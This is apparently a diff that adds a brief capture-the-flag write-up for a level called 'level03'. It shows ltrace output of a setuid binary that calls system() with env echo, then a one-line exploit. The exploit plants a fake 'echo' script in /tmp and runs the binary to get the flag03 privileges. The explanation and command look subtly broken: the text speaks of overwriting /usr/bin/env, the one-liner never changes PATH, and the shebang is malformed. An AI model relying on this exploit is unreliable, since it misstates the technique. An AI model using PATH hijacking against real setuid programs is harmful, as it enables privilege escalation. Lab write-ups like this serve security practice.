@@ -1,0 +1,11 @@
+ltrace ./level03 reveal some syscalls:
+  setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                                                           = 0
+  setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) 
+  system("/usr/bin/env echo Exploit me")
+
+2003 correspond to setgid and write, exec
+
+-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
+The SUID and GUID are set, so the command is executed as flag03,
+we juste need to overwrite /usr/bin/env to launch our own script:
+echo -e '#!/usr/bin/env/\n/bin/getflag' > /tmp/echo && chmod +x /tmp/echo && ./level03;
